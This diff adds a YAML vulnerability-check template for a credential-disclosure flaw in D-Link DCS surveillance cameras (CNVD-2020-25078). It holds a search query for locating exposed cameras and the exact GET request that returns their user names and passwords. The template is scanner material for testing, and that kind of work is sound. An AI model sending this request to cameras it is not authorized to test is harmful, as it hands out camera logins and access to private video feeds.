@@ -1,0 +1,18 @@
+name: D-Link DCS系列监控 账号密码信息泄露漏洞 CNVD-2020-25078
+manual: true
+query: '(app="DLink-Network-Camera" || title="Document Error: Unauthorized")'
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /config/getuser?index=0
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"name") && response.body.bcontains(b"pass")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: D-Link DCS系列监控 通过访问特定的URL得到账号密码信息，攻击者通过漏洞进入后台可以获取视频监控页面
+  tags: 账号密码泄露
